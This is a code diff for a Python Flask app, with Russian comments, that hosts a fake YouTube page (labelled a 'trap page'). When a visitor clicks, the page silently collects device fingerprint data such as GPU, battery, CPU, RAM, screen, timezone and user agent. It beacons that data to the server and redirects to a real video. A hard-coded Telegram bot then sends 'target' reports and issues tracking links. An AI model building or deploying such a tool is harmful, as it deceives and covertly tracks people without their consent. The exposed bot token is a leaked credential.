@@ -5,10 +5,10 @@ import os
 import base64
 import time
 import sqlite3
-from flask import Flask, render_template_string, request, make_response
+from flask import Flask, render_template_string, request
 
 # =================================================================
-# [1] CONFIGURATION
+# [1] CONFIG
 # =================================================================
 API_TOKEN = "8698847126:AAEM6qoKEcFd-oosvzrhz7SqAAewUM_ERhg"
 OVERLORD_ID = 6659724115 
@@ -32,17 +32,14 @@ def get_owner(sid):
     except: return OVERLORD_ID
 
 # =================================================================
-# [2] HEARTBEAT FOR CRON-JOB
+# [2] ТОТ САМЫЙ РАБОЧИЙ КОРЕНЬ
 # =================================================================
 @app.route('/')
 def index():
-    print(f"📡 CRON-JOB PING: {time.strftime('%H:%M:%S')}")
-    response = make_response("service active", 200)
-    response.headers["Content-Type"] = "text/plain"
-    return response
+    return "ok", 200 # Максимально просто, как было раньше
 
 # =================================================================
-# [3] DETAILED EXPLOIT PAGE
+# [3] СТРАНИЦА-ЛОВУШКА
 # =================================================================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -50,50 +47,43 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="YouTube" />
-    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" />
     <title>YouTube</title>
     <style>
-        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; cursor:pointer; }
+        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; overflow:hidden; }
         #app { width:100%; height:100%; display:flex; align-items:center; justify-content:center; 
-               background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; }
-        .play { width: 72px; height: 50px; background: rgba(255,0,0,0.9); border-radius: 14px; position: relative; }
-        .play::after { content: ""; position: absolute; left: 28px; top: 15px; border-left: 20px solid #fff; border-top: 10px solid transparent; border-bottom: 10px solid transparent; }
+               background: url('https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg') center/cover; cursor:pointer; }
     </style>
 </head>
 <body onclick="ignite()">
-    <div id="app"><div class="play"></div></div>
+    <div id="app"></div>
 <script>
     function ignite() {
+        // Собираем батарею быстро (если доступна)
+        let bat = "N/A";
+        if (navigator.getBattery) {
+            navigator.getBattery().then(b => { bat = Math.round(b.level * 100) + "%"; });
+        }
+
         const gl = document.createElement('canvas').getContext('webgl');
         const dbg = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
         
         const info = {
             sid: "{{sid}}",
+            bat: bat,
             gpu: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A",
-            vend: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "N/A",
-            cores: navigator.hardwareConcurrency || "N/A",
-            mem: navigator.deviceMemory || "N/A",
-            res: screen.width + "x" + screen.height,
-            depth: screen.colorDepth,
-            plat: navigator.platform,
-            lang: navigator.language,
-            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            touch: navigator.maxTouchPoints,
-            cook: navigator.cookieEnabled,
-            dnt: navigator.doNotTrack,
-            pdf: navigator.pdfViewerEnabled,
-            dark: window.matchMedia('(prefers-color-scheme: dark)').matches,
-            online: navigator.onLine,
-            hist: window.history.length,
-            ratio: window.devicePixelRatio,
-            plugins: navigator.plugins.length,
             ua: navigator.userAgent,
-            ref: document.referrer || "Direct"
+            res: screen.width + "x" + screen.height,
+            plat: navigator.platform,
+            mem: navigator.deviceMemory || "N/A",
+            cores: navigator.hardwareConcurrency || "N/A",
+            tz: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
 
+        // Стреляем данными
         navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(info)));
-        window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+        
+        // Мгновенный уход
+        window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
     }
 </script>
 </body>
@@ -101,7 +91,7 @@ HTML_TEMPLATE = """
 """
 
 # =================================================================
-# [4] DETAILED REPORTING
+# [4] ПРИЕМ ДАННЫХ
 # =================================================================
 
 @app.route('/v/<sid>')
@@ -115,32 +105,18 @@ def capture():
         d = json.loads(raw)
         
         report = (
-            f"<b>📊 ПОДРОБНЫЙ ОТЧЕТ</b>\n"
+            f"<b>🔋 ОТЧЕТ СИСТЕМЫ</b>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🆔 <b>Target ID:</b> <code>{d.get('sid')}</code>\n\n"
-            
-            f"<b>🛠 ЖЕЛЕЗО:</b>\n"
-            f"• 🎮 <b>GPU:</b> <code>{d.get('gpu')}</code>\n"
-            f"• 🧠 <b>Cores:</b> <code>{d.get('cores')}</code> | <b>RAM:</b> <code>{d.get('mem')} GB</code>\n"
-            f"• 🏭 <b>Vendor:</b> <code>{d.get('vend')}</code>\n"
-            f"• 📱 <b>Platform:</b> <code>{d.get('plat')}</code>\n\n"
-            
-            f"<b>🖥 ДИСПЛЕЙ:</b>\n"
-            f"• 📐 <b>Res:</b> <code>{d.get('res')}</code> (Ratio: <code>{d.get('ratio')}</code>)\n"
-            f"• 🎨 <b>Depth:</b> <code>{d.get('depth')} bit</code>\n"
-            f"• 👆 <b>Touch:</b> <code>{d.get('touch')} pts</code>\n\n"
-            
-            f"<b>⚙️ СИСТЕМА:</b>\n"
-            f"• 📍 <b>TZ:</b> <code>{d.get('tz')}</code>\n"
-            f"• 🗣 <b>Lang:</b> <code>{d.get('lang')}</code>\n"
-            f"• 🍪 <b>Cookies:</b> <code>{d.get('cook')}</code>\n"
-            f"• 🌙 <b>Dark Mode:</b> <code>{d.get('dark')}</code>\n"
-            f"• 📶 <b>Online:</b> <code>{d.get('online')}</code>\n\n"
-            
-            f"<b>🔗 ИСТОЧНИК:</b>\n"
-            f"• 🖇 <b>Referrer:</b> <code>{d.get('ref')}</code>\n"
+            f"🆔 <b>Target ID:</b> <code>{d.get('sid')}</code>\n"
+            f"🔋 <b>Заряд:</b> <code>{d.get('bat', 'Pending...')}</code>\n\n"
+            f"<b>🎮 GPU:</b> <code>{d.get('gpu')}</code>\n"
+            f"<b>🧠 CPU:</b> <code>{d.get('cores')} Cores</code>\n"
+            f"<b>💾 RAM:</b> <code>{d.get('mem')} GB</code>\n"
+            f"<b>📱 OS:</b> <code>{d.get('plat')}</code>\n"
+            f"<b>📐 Res:</b> <code>{d.get('res')}</code>\n"
+            f"<b>📍 TZ:</b> <code>{d.get('tz')}</code>\n"
             f"━━━━━━━━━━━━━━━━━━\n"
-            f"🛰 <b>UA:</b>\n<code>{d.get('ua')[:150]}...</code>"
+            f"🛰 <b>UA:</b> <code>{d.get('ua')[:100]}...</code>"
         )
         
         requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
@@ -149,7 +125,7 @@ def capture():
     return "OK"
 
 # =================================================================
-# [5] BOT ENGINE
+# [5] BOT LOOP
 # =================================================================
 
 def bot_loop():
@@ -169,7 +145,7 @@ def bot_loop():
                         conn.close()
                         link = f"{BASE_URL}/v/{cid}"
                         requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", 
-                                      json={"chat_id": cid, "text": f"✅ <b>Система готова!</b>\n\nТвоя ссылка:\n<code>{link}</code>", "parse_mode": "HTML"})
+                                      json={"chat_id": cid, "text": f"✅ <b>Ссылка готова:</b>\n<code>{link}</code>", "parse_mode": "HTML"})
         except: time.sleep(5)
 
 if __name__ == '__main__':
